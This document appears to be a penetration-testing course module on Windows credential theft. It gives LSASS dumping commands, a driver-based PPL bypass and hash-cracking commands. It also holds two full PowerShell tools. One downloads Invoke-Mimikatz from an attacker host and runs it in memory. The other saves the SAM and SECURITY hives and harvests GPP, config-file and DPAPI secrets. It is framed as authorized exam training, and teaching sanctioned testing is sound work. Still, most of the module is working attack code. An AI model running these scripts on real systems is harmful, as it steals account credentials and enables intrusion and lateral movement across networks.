::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Credentials: LSASS, SAM, and alternates

If LSASS access fails, that is not the end — try LSA Secrets, SAM, Autologon, DPAPI, configs, GPP, and scheduled tasks. Classify the protection first; do not slam LSASS. If you are still low-priv with no path to admin or SYSTEM, elevate first (module 06) instead of forcing a dump.

## Classify before touching LSASS

If `whoami /priv` has no `SeDebugPrivilege` and you are not SYSTEM, skip the dump and go to alternate sources. If `RunAsPPL` is **1 or 2**, LSA Protection is on and a normal dump is denied. If `LsaCfgFlags` is non-zero, treat that as Credential Guard and do not assume a bypass. If neither flag is set but the tool still dies, change the load shape, not the dump target.

<!-- VERIFY: m07-invoke-mimikatz-reflect.ps1 still aborts only when RunAsPPL -ge 2 (and its comment says "1=signature required; 2=signature+PPL start"). Courseware (§17.3) and the lab set RunAsPPL=1 to enable LSA Protection; Microsoft documents both 1 (UEFI lock) and 2 (no UEFI lock) as enabled. Confirm before changing the script. -->

```powershell
# Current rights and SeDebugPrivilege
whoami /priv
# Whether LSASS is RunAsPPL-protected (0 = off; 1 or 2 = LSA Protection on)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # non-zero hints Credential Guard related
# LSASS process (PID / integrity)
Get-Process lsass | Select-Object Id, Name
# Minimal contact probe: "access denied" vs "process protected"
tasklist /FI "IMAGENAME eq lsass.exe"
```

If PPL is on and you can load a signed driver (admin or SYSTEM, `SeLoadDriverPrivilege`), the course path is Mimikatz `!+` then `!processprotect /process:lsass.exe /remove`. That uploads `mimidrv.sys`, which AV often kills — prefer alternate sources first, and do not treat this as a Credential Guard bypass.

Do not keep retrying dumps on a PPL or Credential Guard host: classify in about 30 seconds, then switch.

## Touch LSASS only when it is unprotected

If there is no PPL or Credential Guard, pick a load shape and contact LSASS. If the tool lands and gets killed, change shape (MiniDump or reflective), not posture.

- [ ] Confirm classification: no PPL / Credential Guard, and SeDebugPrivilege available
- [ ] Choose a shape: in-memory Invoke-Mimikatz, comsvcs / procdump MiniDump, or .NET assembly load
- [ ] Run one collection command and copy artifacts off
- [ ] Authenticate once for real with the identity you got (module 15 / 12)

```text
# A. Normal in-memory — land mimikatz PE, or:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'

# B. Built-in dump + offline parse (least noisy, most stable):
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full
# or: procdump -ma <LSASS_PID> ls.dmp
# copy back and parse: mimikatz sekurlsa::minidump ls.dmp  then  sekurlsa::logonpasswords

# C. .NET assembly load (avoid a landed EXE): Assembly.Load + reflective entry
#    (use -Mode Assembly placeholder in m07-invoke-mimikatz-reflect.ps1)

# D. Command-line obfuscation / encoded calls (AMSI static features); encode/encrypt before delivery (module 05)
```

Useful Mimikatz artifacts: `sekurlsa::logonpasswords` (interactive logon cache cleartext / NTLM), `sekurlsa::wdigest`, `sekurlsa::kerberos` (tickets), `sekurlsa::msv` (msv1_0 cache). WDigest cleartext is off by default on Windows 8.1+; to cache it after later logons, set `UseLogonCredential=1` under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`.

`m07-invoke-mimikatz-reflect.ps1` covers Invoke / comsvcs MiniDump (and a RunAsPPL plus rights pre-check). If AMSI blocks the loader, handle that first (module 05). Prefer in-memory load; mimikatz and `Invoke-Mimikatz` are strong static signatures. Keep dumps under a system or already-whitelisted directory, copy off, and clean.

If the dump succeeds but offline parse is empty, match `sekurlsa::minidump` / Mimikatz versions to the OS, and confirm you dumped the right PID with an x64 tool on a 64-bit host.

::: details `m07-invoke-mimikatz-reflect.ps1` · click to expand

````powershell
<#
Purpose: Credential collection when LSASS has no strong protection — load Invoke-Mimikatz in memory (no on-disk ps1/exe) or fall back to comsvcs MiniDump
Scenario: 46 (classify first: this script only handles the “confirmed LSASS is touchable” branch; if PPL/Credential Guard is on, abandon per module guidance and use m07-credential-sources.ps1)
Depends: PowerShell 3.0+; Invoke mode needs a readable Invoke-Mimikatz.ps1 (local file or HTTP source);
         MiniDump mode needs SeDebugPrivilege (admin/SYSTEM); both are denied under RunAsPPL>=2 or Credential Guard
Usage: powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
       Remote source: ... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
       Dump mode: ... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
       Force ignore classification (generally not recommended): ... -Force
Placeholders: LHOST=attacker IP hosting Invoke-Mimikatz.ps1; SourceFile/SourceUrl choose one
Test status: Not run on Windows (host is macOS); syntax checked by hand. If AMSI blocks this script/delivered content, handle per scenarios 18/19 (encode/encrypt, host match) before redelivery
#>
[CmdletBinding()]
param(
    [ValidateSet('Invoke', 'MiniDump')][string]$Mode = 'Invoke',
    [string]$Command = '"sekurlsa::logonpasswords" "exit"',
    [string]$SourceFile = '',
    [string]$SourceUrl = '',
    [int]$LsassPid = 0,
    [string]$DumpDir = "$env:WINDIR\Temp",
    [switch]$Force
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}
function Get-LsaProtectionStatus {
    # RunAsPPL: 0=off; 1=signature required; 2=signature+PPL start (normal dump blocked). Non-zero LsaCfgFlags hints Credential Guard direction.
    $out = [pscustomobject]@{ RunAsPPL = 0; LsaCfgFlags = 0 }
    try {
        $l = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null)
        if ($l -match '0x([0-9a-fA-F]+)') { $out.RunAsPPL = [Convert]::ToInt32($Matches[1], 16) }
        $c = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags 2>$null)
        if ($c -match '0x([0-9a-fA-F]+)') { $out.LsaCfgFlags = [Convert]::ToInt32($Matches[1], 16) }
    } catch { }
    return $out
}
function Enable-SeDebugPrivilege {
    # Enable SeDebugPrivilege for the current process (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)
    if (-not ('M07Priv.Native' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace M07Priv {
    [StructLayout(LayoutKind.Sequential)]
    public struct LuidAttr { public long Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct TokenPrivileges { public uint PrivilegeCount; public LuidAttr Privilege; }
    public static class Native {
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string s, string n, out long l);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TokenPrivileges n, uint b, IntPtr p, IntPtr r);
    }
}
'@
    }
    $h = [IntPtr]::Zero
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    if (-not [M07Priv.Native]::OpenProcessToken($proc.Handle, 0x28, [ref]$h)) { return $false }
    $luid = [long]0
    if (-not [M07Priv.Native]::LookupPrivilegeValue($null, 'SeDebugPrivilege', [ref]$luid)) { return $false }
    $tp = New-Object M07Priv.TokenPrivileges
    $tp.PrivilegeCount = 1; $tp.Privilege.Luid = $luid; $tp.Privilege.Attributes = 0x2  # SE_PRIVILEGE_ENABLED
    $ok = [M07Priv.Native]::AdjustTokenPrivileges($h, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
    return $ok
}

Section "Classify (decide whether LSASS is worth touching)"
if (-not (Test-Admin)) {
    Write-Output "[-] Not admin/SYSTEM: cannot read LSASS normally. Prefer m07-credential-sources.ps1 for alternate sources."
    if (-not $Force) { exit 1 }
}
$priv = Enable-SeDebugPrivilege
Write-Output ("[+] SeDebugPrivilege available (enable attempted): {0}" -f $priv)
$prot = Get-LsaProtectionStatus
Write-Output ("[+] LSA protection: RunAsPPL={0} LsaCfgFlags={1} (>=2 means normal dump is denied)" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
if (($prot.RunAsPPL -ge 2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
    Write-Output "[-] LSASS protected by LSA Protection / Credential Guard: per module guidance do not assume a bypass — switch to m07-credential-sources.ps1 (SAM/LSA Secrets/registry/DPAPI/config/GPP/scheduled tasks)."
    exit 2
}

if ($Mode -eq 'Invoke') {
    Section "Invoke-Mimikatz (in-memory reflection, no disk)"
    $src = ''
    if ($SourceFile -ne '') { $src = Get-Content -Raw -LiteralPath $SourceFile -ErrorAction Stop }
    elseif ($SourceUrl -ne '') {
        Write-Output "[*] Pulling from $SourceUrl (proxy/egress: see docs/09)..."
        $src = (New-Object System.Net.WebClient).DownloadString($SourceUrl)
    } else { Write-Output "[-] Invoke mode needs -SourceFile or -SourceUrl (Invoke-Mimikatz.ps1 is too large to embed)"; exit 3 }
    Invoke-Expression $src
    if (-not (Get-Command Invoke-Mimikatz -ErrorAction SilentlyContinue)) {
        Write-Output "[-] Function Invoke-Mimikatz failed to load (AMSI/language mode may have blocked it — retry after scenarios 18/19)"; exit 4
    }
    Write-Output "[*] Running: $Command"
    & (Get-Command Invoke-Mimikatz) -Command $Command
    Write-Output "[*] Done. If output includes logonpasswords cache, authenticate for real with that identity (M15/M12)."
}
else {
    Section "MiniDump (comsvcs.dll, parse offline)"
    $ls = if ($LsassPid -gt 0) { Get-Process -Id $LsassPid -ErrorAction Stop } else { Get-Process lsass -ErrorAction Stop }
    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $out = Join-Path $DumpDir ("lsass_{0}_{1}.dmp" -f $ls.Id, $stamp)
    Write-Output "[*] dump LSASS PID=$($ls.Id) -> $out"
    # Direct rundll32 comsvcs MiniDump; under PPL the process fails / file is empty — expected (see classify)
    & rundll32.exe "$env:WINDIR\System32\comsvcs.dll, MiniDump" $ls.Id $out "full"
    Start-Sleep -Seconds 2
    if ((Test-Path $out) -and ((Get-Item $out).Length -gt 0)) {
        Write-Output "[+] dump OK: $out ($((Get-Item $out).Length) bytes)"
        Write-Output "[*] Copy back for offline parse: mimikatz.exe `"sekurlsa::minidump $out`" `"sekurlsa::logonpasswords`" `"exit`""
    } else {
        Write-Output "[-] dump failed/empty: confirm SeDebugPrivilege, PPL off, correct PID; or switch to -Mode Invoke"
    }
}
````

:::
## Alternate sources

If LSASS is protected or the tools are blocked, sweep the host with `m07-credential-sources.ps1` — or walk the table by hand. Highest rights first; prefer what only SYSTEM can read. This script only collects; parse hives and `Groups.xml` offline on the attacker box.

| Source | Contents | Rights needed | Key commands / locations |
|---|---|---|---|
| LSA Secrets | `DefaultPassword`, service account passwords, DPAPI machine keys | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
| SAM | Local account NTLM hashes | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
| Registry Winlogon / AutoLogon | Cleartext password | Admin | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| Cached domain logons | Domain credential cache (DCC2) | SYSTEM | `lsadump::cache` (offline crack needs DCC2) |
| DPAPI | User master keys + app passwords (browser / Outlook / vault) | Matching user | User profile `AppData\Roaming\Microsoft\Protect` + decrypt in that context |
| WDigest | Cleartext (on by default on older systems; off on 8.1+ unless `UseLogonCredential=1`) | SYSTEM | `sekurlsa::wdigest` |
| Config files | Hardcoded passwords in deploy / scripts | Read rights enough | Full-disk search: `unattend.xml`, `web.config`, `*.config`, `*.ps1` / `*.bat` / `*.xml` |
| GPP | Domain Group Policy Preferences passwords | Read SYSVOL (domain user enough) | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` `cPassword` |
| Scheduled tasks | Creds / scripts referenced by task actions | Admin read of registry | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |

`reg save` and large copies leave traces — keep artifacts under system dirs, copy off, and clean. Record the rights each source needs so you do not run blind outside SYSTEM.

If SAM has no local accounts and LSA Secrets has no reusable passwords, go to configs, scheduled tasks, and GPP; in a domain, prioritize GPP and leftover domain creds in tasks. If LSASS is unreadable **and** alternate sources are empty, do not linger — convert the session into lateral / enum (modules 12 / 15) and repeat the source list on another host.

::: details `m07-credential-sources.ps1` · click to expand

````powershell
<#
Purpose: Collect Windows credential material by source (SAM / LSA Secrets / registry AutoLogon / cached logons / DPAPI / config files / scheduled tasks / GPP), annotate required rights and artifacts for offline parse
Scenario: 46 — when LSASS is protected or credential tools are blocked, switch to alternate sources; after high rights (especially SYSTEM), sweep host identity material once
Depends: Admin covers most; SAM, LSA Secrets, cached logons need SYSTEM; DPAPI needs matching user session; GPP needs domain identity with SYSVOL reachability
Usage: powershell -ep bypass -f m07-credential-sources.ps1 -WorkDir C:\Windows\Temp
       Max coverage (recommended): run as SYSTEM (PsExec -s / schtasks /create /ru SYSTEM /run — see M06/M27 ideas)
       GPP search needs domain: ... -Domain corp.local
Placeholders: DOMAIN=target domain FQDN (SYSVOL path); WorkDir=artifact directory (must be writable; prefer system dirs)
Test status: Not run on Windows (host is macOS); syntax checked by hand. Take reg-save hives and Groups.xml back to the attacker box for offline parse — do not crack on the target
#>
[CmdletBinding()]
param(
    [string]$WorkDir = "$env:WINDIR\Temp\m07creds",
    [string]$Domain = '',          # e.g. corp.local; non-empty enables GPP (SYSVOL) search
    [switch]$SkipConfigScan        # full-disk-ish config scans are noisy; can skip
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Try-Run($label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}: {1}" -f $label, (& $block)) }
    catch { Write-Output ("[-] {0}: {1}" -f $label, $_.Exception.Message) }
}
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
$Sys  = (whoami) -match 'nt authority\\system'
$Admin = Test-Admin
Write-Output "[*] Context: $(whoami) | Admin=$Admin | SYSTEM=$Sys | Artifact dir=$WorkDir"
Write-Output "[*] Rights legend: SYSTEM > Admin > current user > read-only enough. This script only collects; parse hive/Groups.xml offline on the attacker box."

Section "1. SAM (local account NTLM) — needs SYSTEM"
if ($Sys) {
    & reg.exe save HKLM\SAM "$WorkDir\sam.hive" /y *> $null
    & reg.exe save HKLM\SYSTEM "$WorkDir\sys.hive" /y *> $null
    if ((Test-Path "$WorkDir\sam.hive")) {
        Write-Output "[+] sam.hive/sys.hive saved. Offline: secretsdump -sam sam.hive -system sys.hive LOCAL (or mimikatz lsadump::sam /system:sys.hive)"
    } else { Write-Output "[-] reg save failed (needs SYSTEM + SeBackupPrivilege)" }
} else { Write-Output "[-] Not SYSTEM — skipped. Re-run this section after elevating to SYSTEM (PsExec -s / scheduled task / M06)" }

Section "2. LSA Secrets — needs SYSTEM (service account passwords / DPAPI machine keys)"
if ($Sys) {
    & reg.exe save HKLM\SECURITY "$WorkDir\sec.hive" /y *> $null
    if ((Test-Path "$WorkDir\sec.hive")) {
        Write-Output "[+] sec.hive saved. Offline: secretsdump -security sec.hive -system sys.hive LOCAL (or mimikatz lsadump::secrets /system:sys.hive)"
    } else { Write-Output "[-] reg save failed" }
} else { Write-Output "[-] Not SYSTEM — skipped (HKLM\SECURITY is unreadable even as admin)" }

Section "3. Registry AutoLogon/Winlogon (cleartext) — read rights / admin"
Try-Run "Winlogon AutoLogon values" {
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName 2>$null)
    $dp = (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null)
    if ($dp) { $dp } else { "DefaultPassword not set (or unreadable)" }
}
Try-Run "Leftover registry password keys" {
    $keys = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
    $found = foreach ($k in $keys) { (& reg.exe query $k /s 2>$null) | Select-String -Pattern 'Password|Secret' }
    if ($found) { ($found | Select-Object -First 5).Line -join ' | ' } else { 'No obvious password keys found' }
}

Section "4. Cached domain logons — needs SYSTEM (DCC2 hashes)"
if ($Sys) {
    Try-Run "HKLM\SECURITY\Cache entries" {
        $n = (& reg.exe query "HKLM\SECURITY\Cache" 2>$null | Select-String -Pattern 'NL\$' ).Count
        "Cached entries ≈$n (offline: mimikatz lsadump::cache /system:sys.hive; crack with hashcat -m 2100)"
    }
} else { Write-Output "[-] Not SYSTEM — skipped" }

Section "5. DPAPI (master keys / credential files) — needs matching user session"
Try-Run "Current-user DPAPI" {
    $u = $env:USERPROFILE
    $roam = "$u\AppData\Roaming\Microsoft\Protect"; $loc = "$u\AppData\Local\Microsoft\Protect"
    $cred = "$u\AppData\Local\Microsoft\Credentials"; $vault = "$u\AppData\Local\Microsoft\Vault"
    $r = @()
    if (Test-Path $roam) { $r += "Roaming master keys x$((Get-ChildItem $roam -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $loc)  { $r += "Local master keys x$((Get-ChildItem $loc -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $cred) { $r += "Credentials files x$((Get-ChildItem $cred -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $vault) { $r += "Vault directory present" }
    if ($r) { $r -join ' | ' } else { 'None (or current user has no DPAPI material)' }
}
Try-Run "Other user profiles (inventory only; decrypt needs that user)" {
    (Get-ChildItem C:\Users -Directory -EA SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | Select-Object -ExpandProperty Name) -join ', '
}

Section "6. Config-file leftover passwords — read rights enough"
if (-not $SkipConfigScan) {
    $dirs = 'C:\Windows\Panther','C:\Windows\System32\sysprep','C:\inetpub','C:\ProgramData','C:\Users\Public'
    $files = Get-ChildItem $dirs -Recurse -Include unattend*.xml,*.config,*.ps1,*.bat,*.cmd,*.vbs,*.xml,*.txt -File -EA SilentlyContinue |
             Where-Object { $_.Length -lt 2MB } | Select-Object -First 400
    $hits = $files | Select-String -Pattern 'password\s*[=:]\s*\S+|passwd\s*[=:]\s*\S+|<Password>|<Value>|pwd\s*=' -EA SilentlyContinue | Select-Object -First 15
    if ($hits) { ($hits | ForEach-Object { "{0}:{1}" -f $_.Path, $_.Line.Trim() }) -join "`n" }
    else { 'None found (manually widen dirs: site folders with web.config, user-home scripts)' }
} else { Write-Output '[-] Skipped per -SkipConfigScan' }

Section "7. Scripts/creds in scheduled-task actions — admin"
Try-Run "Scripts referenced by task actions" {
    $csv = (& schtasks.exe /query /fo csv /v 2>$null) | ConvertFrom-Csv
    $scripts = $csv | Where-Object { $_.'Task To Run' -match '\.(bat|cmd|ps1|vbs|js|exe) ' -and $_.'Task To Run' -notmatch '\\Windows\\' } |
               Select-Object -First 8
    if ($scripts) { ($scripts | ForEach-Object { "{0} -> {1} (RunAs:{2})" -f $_.TaskName, $_.'Task To Run', $_.'Run As User' }) -join "`n" }
    else { 'No non-system script-like task actions (still worth spot-checking TaskCache registry)' }
}

Section "8. GPP (SYSVOL Group Policy Preferences) — domain identity + read SYSVOL"
if ($Domain -ne '') {
    $pol = "\\$Domain\SYSVOL\$Domain\Policies"
    if (Test-Path $pol) {
        $g = Get-ChildItem $pol -Recurse -Filter Groups.xml -File -EA SilentlyContinue
        foreach ($f in $g) {
            $m = [regex]::Matches((Get-Content -Raw $f.FullName), 'userName="([^"]+)"[^>]*?cPassword="([^"]+)"')
            if ($m.Count) { Write-Output ("[+] {0}: {1}" -f $f.FullName, (($m | ForEach-Object { "$($_.Groups[1].Value):$($_.Groups[2].Value)" }) -join ', ')) }
        }
        Write-Output "[*] Decrypt listed cPassword offline with gpp-decrypt; also scan other .xml/.ini leftovers under SYSVOL"
    } else { Write-Output "[-] SYSVOL unreachable ($pol). Check: domain-joined host, current identity has domain rights, DNS is correct" }
} else { Write-Output "[-] No -Domain given; GPP skipped. Domain-joined hosts should re-run with it" }

Section "Done: artifacts and next steps"
Write-Output "[*] Hive files under $WorkDir:"
Get-ChildItem $WorkDir -File | ForEach-Object { "    $($_.Name) ($($_.Length) bytes)" }
Write-Output "[*] Priority: under SYSTEM, parse SAM/LSA Secrets first (often identities usable for lateral); without SYSTEM, check config/scheduled tasks/GPP first (read rights enough)"
Write-Output "[*] Authenticate once for real with parsed identities via M15 (WinRM cleartext/hash) or M12 (PTT/delegation) — do not stop at the hash string itself"
````

:::
## Offline cracking

Parse hives on the attacker box, then authenticate once for real. Prefer pass-the-hash (it does not hit password policy) over guessing cleartext under a lockout policy. Do not keep cracking hashes that cannot authenticate.

```bash
# NTLM (SAM / LSA Secrets / sekurlsa artifacts)
hashcat -m 1000 ntlm.txt wordlist.txt
# NetNTLMv2 (if you later capture relay hashes — m16 / other scenario artifacts)
hashcat -m 5600 netntlmv2.txt wordlist.txt
# DCC2 (cached domain credentials)
hashcat -m 2100 dcc2.txt wordlist.txt
# After cleartext/hash: see M15 (WinRM hash/cleartext), M12 (PTT / over-pass-the-hash tickets)
```

Verify the loop: `secretsdump -sam sam.hive -system sys.hive LOCAL` (or mimikatz `lsadump::sam /system:sys.hive`) lists hashes — pick one NTLM and authenticate once laterally (module 15). Account passwords from LSA Secrets: `net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` or WinRM. Decrypt GPP `cPassword` with `gpp-decrypt` first.

## Cheat sheet

| You want to… | Use |
|---|---|
| Classify LSA Protection | `reg query ...\Lsa /v RunAsPPL` (1 or 2 = on) and `/v LsaCfgFlags` |
| Dump when unprotected | `m07-invoke-mimikatz-reflect.ps1` (`-Mode Invoke` or `-Mode MiniDump`) |
| MiniDump without a landed EXE | `rundll32 comsvcs.dll, MiniDump` / `procdump`, then `sekurlsa::minidump` offline |
| Bypass PPL with a driver | Mimikatz `!+` then `!processprotect /process:lsass.exe /remove` (AV may kill `mimidrv.sys`) |
| Sweep alternates | `m07-credential-sources.ps1` (SAM / LSA Secrets / Autologon / DPAPI / configs / GPP / tasks) |
| Crack hashes | `hashcat -m 1000` (NTLM), `-m 2100` (DCC2), `-m 5600` (NetNTLMv2) |

After identity: lateral [15-winrm-lateral](/modules/15-winrm-lateral) (WinRM cleartext / hash), tickets and over-pass-the-hash in [12-ad-attacks](/modules/12-ad-attacks). Hash relay / capture (not the main path here): modules 16 / 11.
